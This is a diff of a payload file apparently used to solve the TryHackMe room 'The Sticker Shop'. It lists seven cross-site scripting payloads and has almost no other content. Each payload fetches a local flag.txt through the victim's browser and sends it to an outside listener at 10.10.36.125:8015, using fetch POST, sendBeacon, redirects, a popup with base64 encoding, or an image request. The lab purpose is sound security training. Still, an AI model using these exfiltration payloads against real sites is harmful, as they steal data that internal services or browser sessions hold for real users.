@@ -1,86 +1,86 @@
 Payload used on TryHackMe room The Sticker Shop https://tryhackme.com/r/room/thestickershop
 video walk through: https://youtu.be/lB68TvzPEHI
 
-<script>
-fetch('http://127.0.0.1:8080/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    fetch('http://10.10.36.125:8015', { 
-      method: 'POST',
-      body: data
-    });
-  });
-</script>
+<script><br />
+fetch('http://127.0.0.1:8080/flag.txt')<br />
+  .then(response => response.text())<br />
+  .then(data => {<br />
+    fetch('http://10.10.36.125:8015', { <br />
+      method: 'POST',<br />
+      body: data<br />
+    });<br />
+  });<br />
+</script><br />
 
-==
-<script>
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://127.0.0.1:8080/flag.txt', true);
-xhr.onload = function() {
-    fetch('http://10.10.36.125:8015', {
-        method: 'POST',
-        body: xhr.responseText
-    });
-};
-xhr.send();
-</script>
-
-==
-
-<script>
-fetch('http://127.0.0.1:8080/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    navigator.sendBeacon('http://10.10.36.125:8015', data);
-  });
-</script>
-
-===
-
-<script>
-(async () => {
-  try {
-    const response = await fetch('http://127.0.0.1:8080/flag.txt');
-    const data = await response.text();
-    await fetch('http://10.10.36.125:8015', {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: data
-    });
-  } catch (error) {
-    // Optional error handling
-  }
-})();
-</script>
-
-== get
-<script>
-fetch('http://127.0.0.1:8080/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    window.location = `http://10.10.36.125:8015?flag=${encodeURIComponent(data)}`;
-  });
-</script>
-
-
-base64:
-
-<script>
-fetch('http://127.0.0.1:8080/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    window.open(`http://10.10.36.125:8015?flag=${btoa(data)}`, '_blank');
-  });
-</script>
-
-===
-<script>
-fetch('http://127.0.0.1:8080/flag.txt')
-  .then(response => response.text())
-  .then(data => {
-    var img = new Image();
-    img.src = `http://10.10.36.125:8015/?flag=${encodeURIComponent(data)}`;
-  });
-</script>
-
-===
+==<br />
+<script><br />
+var xhr = new XMLHttpRequest();<br />
+xhr.open('GET', 'http://127.0.0.1:8080/flag.txt', true);<br />
+xhr.onload = function() {<br />
+    fetch('http://10.10.36.125:8015', {<br />
+        method: 'POST',<br />
+        body: xhr.responseText<br />
+    });<br />
+};<br />
+xhr.send();<br />
+</script><br />
+<br />
+==<br />
+<br />
+<script><br />
+fetch('http://127.0.0.1:8080/flag.txt')<br />
+  .then(response => response.text())<br />
+  .then(data => {<br />
+    navigator.sendBeacon('http://10.10.36.125:8015', data);<br />
+  });<br />
+</script><br />
+<br />
+===<br />
+<br />
+<script><br />
+(async () => {<br />
+  try {<br />
+    const response = await fetch('http://127.0.0.1:8080/flag.txt');<br />
+    const data = await response.text();<br />
+    await fetch('http://10.10.36.125:8015', {<br />
+      method: 'POST',<br />
+      headers: { 'Content-Type': 'text/plain' },<br />
+      body: data<br />
+    });<br />
+  } catch (error) {<br />
+    // Optional error handling<br />
+  }<br />
+})();<br />
+</script><br />
+<br />
+== get<br />
+<script><br />
+fetch('http://127.0.0.1:8080/flag.txt')<br />
+  .then(response => response.text())<br />
+  .then(data => {<br />
+    window.location = `http://10.10.36.125:8015?flag=${encodeURIComponent(data)}`;<br />
+  });<br />
+</script><br />
+<br />
+<br />
+base64:<br />
+<br />
+<script><br />
+fetch('http://127.0.0.1:8080/flag.txt')<br />
+  .then(response => response.text())<br />
+  .then(data => {<br />
+    window.open(`http://10.10.36.125:8015?flag=${btoa(data)}`, '_blank');<br />
+  });<br />
+</script><br />
+<br />
+===<br />
+<script><br />
+fetch('http://127.0.0.1:8080/flag.txt')<br />
+  .then(response => response.text())<br />
+  .then(data => {<br />
+    var img = new Image();<br />
+    img.src = `http://10.10.36.125:8015/?flag=${encodeURIComponent(data)}`;<br />
+  });<br />
+</script><br />
+<br />
+===<br />
